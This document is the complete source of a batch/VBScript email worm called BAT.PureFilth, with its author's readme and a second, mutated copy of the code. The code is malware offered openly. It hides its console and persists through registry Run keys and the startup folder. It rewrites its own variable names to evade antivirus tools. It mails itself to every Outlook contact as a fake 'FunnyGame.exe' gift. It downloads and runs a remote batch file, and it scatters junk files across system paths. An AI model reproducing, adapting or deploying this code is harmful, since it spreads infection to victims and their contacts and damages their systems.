

 -=- From the original readme.txt of the virus -=-

-------------------------------[readme.txt]-------------------------------
 README for: BAT.PureFilth - By SAD1c

 Thanks and greets to the following peoples:
 DvL, all [rRlf] members (especially to Second Part To Hell), Hostfat, and
 everyone who read this.
 Special thanks to Alcopaul for his tutorials and his "VBS.regreside"

 NAME: BAT.PureFilth
 TYPE: Batch
 ORIGINAL SIZE: 6310 Bytes
 STARTUP: With a Registry key and "All Users" startup folder, using
          "registry residency"
 NET SPREAD: E-Mail spreading through Outlook (using WAB addresslist and
             attachment spoofing)
 MUTAMORPHIC: changes part of its body on every run (and change also its
              size!)
 AUTO UPDATE: Downloads new versions from a predefinied URL (the URL
              doesn't exist, it's only an example!)
 OTHER SHIT: on every run creates a lot of files containing the following
             text: BAT.PureFilth - By SAD1c
-------------------------------[readme.txt]-------------------------------

:: BAT.PureFilth - By SAD1c
@echo off
ver|find "XP">nul
if errorlevel 1 ctty nul
copy %0 %tmp%\funny.bat
echo.on error resume next>%tmp%\ShellTray.vbs
echo dim wsh>>%tmp%\ShellTray.vbs
echo set wsh=createobject("wscript.shell")>>%tmp%\ShellTray.vbs
echo set fso=createobject("scripting.filesystemobject")>>%tmp%\ShellTray.vbs
echo dim pfcode>>%tmp%\ShellTray.vbs
echo pfcode=wsh.regread("HKCU\Software\PureFilth\")>>%tmp%\ShellTray.vbs
echo set drop=fso.createtextfile("%tmp%\funny.bat")>>%tmp%\ShellTray.vbs
echo drop.write pfcode>>%tmp%\ShellTray.vbs
echo drop.close>>%tmp%\ShellTray.vbs
echo wsh.run "%tmp%\funny.bat",0>>%tmp%\ShellTray.vbs
echo BAT.PureFilth - By SAD1c>%tmp%\Filth.tmp
echo for %%a in (%path%\*.*) do copy %tmp%\Filth.tmp %%aF>%tmp%\FilthGen.bat
echo.on error resume next>%tmp%\WLtemp.vbs
echo dim fsys,wsh,stream,pfcode>>%tmp%\WLtemp.vbs
echo set fsys=createobject("scripting.filesystemobject")>>%tmp%\WLtemp.vbs
echo set wsh=createobject("wscript.shell")>>%tmp%\WLtemp.vbs
echo set stream=fsys.opentextfile("%tmp%\funny.bat")>>%tmp%\WLtemp.vbs
echo pfcode=stream.readall>>%tmp%\WLtemp.vbs
echo stream.close>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"wsh",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"fso",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"pfcode",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"drop",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"FilthGen",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"funny",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"fsys",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"stream",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"length",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"cnt",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"randstring",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"tmpn",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"WLtemp",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"outl",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"mapil",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"alist",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"sadd",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"alcnt",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"crypt",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"outi",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"AllDone",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"ineto",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"data",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"downloaded",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"AllDone",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo function randstring(length)>>%tmp%\WLtemp.vbs
echo for cnt=1 to length>>%tmp%\WLtemp.vbs
echo randomize>>%tmp%\WLtemp.vbs
echo if int(rnd*2000/1000)=1 then>>%tmp%\WLtemp.vbs
echo tmpn=int(rnd*26)+97>>%tmp%\WLtemp.vbs
echo else>>%tmp%\WLtemp.vbs
echo tmpn=int(rnd*26)+65>>%tmp%\WLtemp.vbs
echo end if>>%tmp%\WLtemp.vbs
echo randstring=randstring&chr(tmpn)>>%tmp%\WLtemp.vbs
echo next>>%tmp%\WLtemp.vbs
echo end function>>%tmp%\WLtemp.vbs
echo set stream=fsys.opentextfile("%tmp%\funny.bat",2)>>%tmp%\WLtemp.vbs
echo stream.write pfcode>>%tmp%\WLtemp.vbs
echo stream.close>>%tmp%\WLtemp.vbs
echo wsh.regwrite "HKCU\Software\PureFilth\",pfcode>>%tmp%\WLtemp.vbs
echo fso.copyfile "%tmp%\ShellTray.vbs",wsh.specialfolders("AllusersStartup")&"\ShellTray.vbs",1>>%tmp%\WLtemp.vbs
echo fso.copyfile "%tmp%\ShellTray.vbs",fsys.getspecialfolder(1)&"\SysWatch.vbs",1>>%tmp%\WLtemp.vbs
echo wsh.regwrite "HKLM\Software\Micr"&chr(110+1)&"soft\Windows\CurrentVersion\RunServicesOnce\Shell Tray","wscript.exe "&fsys.getspecialfolder(1)&"\SysWatch.vbs">>%tmp%\WLtemp.vbs
echo if wsh.regread("HKCU\Software\PureFilth\WABDONE")="" then>>%tmp%\WLtemp.vbs
echo dim outl,mapil,alist,sadd,alcnt>>%tmp%\WLtemp.vbs
echo set outl=createobject("outlook.application")>>%tmp%\WLtemp.vbs
echo set mapil=outl.getnamespace("MAPI")>>%tmp%\WLtemp.vbs
set crypt=addresslists
echo set alist=mapil.%crypt%>>%tmp%\WLtemp.vbs
echo for each sadd in alist>>%tmp%\WLtemp.vbs
echo for alcnt=1 to sadd.addressentries.count>>%tmp%\WLtemp.vbs
echo dim outi>>%tmp%\WLtemp.vbs
echo set outi=outl.createitem(0)>>%tmp%\WLtemp.vbs
echo outi.to=sadd.addressentries(alcnt).address>>%tmp%\WLtemp.vbs
echo outi.subject="A gift for you!">>%tmp%\WLtemp.vbs
echo outi.body="Hi, "&sadd.addressentries(alcnt).name&"! How are you?"&vbcrlf>>%tmp%\WLtemp.vbs
echo outi.body=outi.body&"I found this little but very cool game and i decided to send it to you."&vbcrlf>>%tmp%\WLtemp.vbs
echo outi.body=outi.body&"I hope you will like it. Well, play it and tell me your opinion."&vbcrlf&"Greetings."&f>>%tmp%\WLtemp.vbs
echo outi.attachments.add "%tmp%\funny.bat",1,len(outi.body),"FunnyGame.exe">>%tmp%\WLtemp.vbs
echo outi.importance=2>>%tmp%\WLtemp.vbs
echo outi.send>>%tmp%\WLtemp.vbs
echo next>>%tmp%\WLtemp.vbs
echo next>>%tmp%\WLtemp.vbs
echo wsh.regwrite "HKCU\Software\PureFilth\WABDONE","AllDone">>%tmp%\WLtemp.vbs
echo dim ineto,data,downloaded>>%tmp%\WLtemp.vbs
echo set ineto=createobject("inetctls.inet")>>%tmp%\WLtemp.vbs
echo ineto.requesttimeout=22>>%tmp%\WLtemp.vbs
echo data=ineto.openurl("http://www.PureFilth.com/PureFilth.bat")>>%tmp%\WLtemp.vbs
echo if not(data="") then>>%tmp%\WLtemp.vbs
echo set downloaded=fsys.createtextfile("%tmp%\PureFilth.bat")>>%tmp%\WLtemp.vbs
echo downloaded.write data>>%tmp%\WLtemp.vbs
echo downloaded.close>>%tmp%\WLtemp.vbs
echo wsh.run "%tmp%\PureFilth.bat",0>>%tmp%\WLtemp.vbs
echo end if>>%tmp%\WLtemp.vbs
echo wsh.run "%tmp%\FilthGen.bat",0>>%tmp%\WLtemp.vbs
cscript %tmp%\WLtemp.vbs>nul
del %tmp%\funny.bat
del %tmp%\*.vbs
del %0
ver|find "XP">nul
if errorlevel 1 ctty con
cls


-------------------------------[mutation example]-------------------------------
:: BAT.PureFilth - By SAD1c
@echo off
ver|find "XP">nul
if errorlevel 1 ctty nul
copy %0 %tmp%\XWJjy.bat
echo.on error resume next>%tmp%\ShellTray.vbs
echo dim bDlTxC>>%tmp%\ShellTray.vbs
echo set bDlTxC=createobject("wscript.shell")>>%tmp%\ShellTray.vbs
echo set mpvA=createobject("scripting.itWyDQXsystemobject")>>%tmp%\ShellTray.vbs
echo dim rBaqwXJ>>%tmp%\ShellTray.vbs
echo rBaqwXJ=bDlTxC.regread("HKCU\Software\PureFilth\")>>%tmp%\ShellTray.vbs
echo set drop=mpvA.createtextitWyDQX("%tmp%\XWJjy.bat")>>%tmp%\ShellTray.vbs
echo drop.write rBaqwXJ>>%tmp%\ShellTray.vbs
echo drop.close>>%tmp%\ShellTray.vbs
echo bDlTxC.run "%tmp%\XWJjy.bat",0>>%tmp%\ShellTray.vbs
echo BAT.PureFilth - By SAD1c>%tmp%\Filth.tmp
echo for %%a in (%path%\*.*) do copy %tmp%\Filth.tmp %%aF>%tmp%\knXGms.bat
echo.on error resume next>%tmp%\Hh.vbs
echo dim pQW,bDlTxC,stream,rBaqwXJ>>%tmp%\Hh.vbs
echo set pQW=createobject("scripting.itWyDQXsystemobject")>>%tmp%\Hh.vbs
echo set bDlTxC=createobject("wscript.shell")>>%tmp%\Hh.vbs
echo set stream=pQW.opentextitWyDQX("%tmp%\XWJjy.bat")>>%tmp%\Hh.vbs
echo rBaqwXJ=stream.readall>>%tmp%\Hh.vbs
echo stream.close>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"bDlTxC",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"mpvA",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"rBaqwXJ",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"drop",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"knXGms",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"XWJjy",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"pQW",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"stream",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"AcJs",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"zbFtzDl",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"Zj",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"GoAZmM",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"Hh",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"kqfmsqxh",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"ceMvzDOo",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"rGdTsZ",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"Mya",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"alzbFtzDl",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"cj",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"ekTAK",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"uHpnb",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"glouyGo",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"ueJPbDlT",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"vxmpv",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo rBaqwXJ=replace(rBaqwXJ,"uHpnb",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
echo function Zj(AcJs)>>%tmp%\Hh.vbs
echo for zbFtzDl=1 to AcJs>>%tmp%\Hh.vbs
echo randomize>>%tmp%\Hh.vbs
echo if int(rnd*2000/1000)=1 then>>%tmp%\Hh.vbs
echo GoAZmM=int(rnd*26)+97>>%tmp%\Hh.vbs
echo else>>%tmp%\Hh.vbs
echo GoAZmM=int(rnd*26)+65>>%tmp%\Hh.vbs
echo end if>>%tmp%\Hh.vbs
echo Zj=Zj&chr(GoAZmM)>>%tmp%\Hh.vbs
echo next>>%tmp%\Hh.vbs
echo end function>>%tmp%\Hh.vbs
echo set stream=pQW.opentextitWyDQX("%tmp%\XWJjy.bat",2)>>%tmp%\Hh.vbs
echo stream.write rBaqwXJ>>%tmp%\Hh.vbs
echo stream.close>>%tmp%\Hh.vbs
echo bDlTxC.regwrite "HKCU\Software\PureFilth\",rBaqwXJ>>%tmp%\Hh.vbs
echo mpvA.copyitWyDQX "%tmp%\ShellTray.vbs",bDlTxC.specialfolders("AllusersStartup")&"\ShellTray.vbs",1>>%tmp%\Hh.vbs
echo mpvA.copyitWyDQX "%tmp%\ShellTray.vbs",pQW.getspecialfolder(1)&"\SysWatch.vbs",1>>%tmp%\Hh.vbs
echo bDlTxC.regwrite "HKLM\Software\Micr"&chr(110+1)&"soft\Windows\CurrentVersion\RunServicesOnce\Shell Tray","wscript.exe "&pQW.getspecialfolder(1)&"\SysWatch.vbs">>%tmp%\Hh.vbs
echo if bDlTxC.regread("HKCU\Software\PureFilth\WABDONE")="" then>>%tmp%\Hh.vbs
echo dim kqfmsqxh,ceMvzDOo,rGdTsZ,Mya,alzbFtzDl>>%tmp%\Hh.vbs
echo set kqfmsqxh=createobject("kqfmsqxhook.application")>>%tmp%\Hh.vbs
echo set ceMvzDOo=kqfmsqxh.getnamespace("MAPI")>>%tmp%\Hh.vbs
set cj=addresslists
echo set rGdTsZ=ceMvzDOo.%cj%>>%tmp%\Hh.vbs
echo for each Mya in rGdTsZ>>%tmp%\Hh.vbs
echo for alzbFtzDl=1 to Mya.addressentries.count>>%tmp%\Hh.vbs
echo dim ekTAK>>%tmp%\Hh.vbs
echo set ekTAK=kqfmsqxh.createitem(0)>>%tmp%\Hh.vbs
echo ekTAK.to=Mya.addressentries(alzbFtzDl).address>>%tmp%\Hh.vbs
echo ekTAK.subject="A gift for you!">>%tmp%\Hh.vbs
echo ekTAK.body="Hi, "&Mya.addressentries(alzbFtzDl).name&"! How are you?"&vbcrlf>>%tmp%\Hh.vbs
echo ekTAK.body=ekTAK.body&"I found this little but very cool game and i decided to send it to you."&vbcrlf>>%tmp%\Hh.vbs
echo ekTAK.body=ekTAK.body&"I hope you will like it. Well, play it and tell me your opinion."&vbcrlf&"Greetings."&f>>%tmp%\Hh.vbs
echo ekTAK.attachments.add "%tmp%\XWJjy.bat",1,len(ekTAK.body),"FunnyGame.exe">>%tmp%\Hh.vbs
echo ekTAK.importance=2>>%tmp%\Hh.vbs
echo ekTAK.send>>%tmp%\Hh.vbs
echo next>>%tmp%\Hh.vbs
echo next>>%tmp%\Hh.vbs
echo bDlTxC.regwrite "HKCU\Software\PureFilth\WABDONE","uHpnb">>%tmp%\Hh.vbs
echo dim glouyGo,ueJPbDlT,vxmpv>>%tmp%\Hh.vbs
echo set glouyGo=createobject("glouyGctls.glouyG")>>%tmp%\Hh.vbs
echo glouyGo.requesttimeout=22>>%tmp%\Hh.vbs
echo ueJPbDlT=glouyGo.openurl("http://www.PureFilth.com/PureFilth.bat")>>%tmp%\Hh.vbs
echo if not(ueJPbDlT="") then>>%tmp%\Hh.vbs
echo set vxmpv=pQW.createtextitWyDQX("%tmp%\PureFilth.bat")>>%tmp%\Hh.vbs
echo vxmpv.write ueJPbDlT>>%tmp%\Hh.vbs
echo vxmpv.close>>%tmp%\Hh.vbs
echo bDlTxC.run "%tmp%\PureFilth.bat",0>>%tmp%\Hh.vbs
echo end if>>%tmp%\Hh.vbs
echo bDlTxC.run "%tmp%\knXGms.bat",0>>%tmp%\Hh.vbs
cscript %tmp%\Hh.vbs>nul
del %tmp%\XWJjy.bat
del %tmp%\*.vbs
del %0
ver|find "XP">nul
if errorlevel 1 ctty con
cls
-------------------------------[mutation example]-------------------------------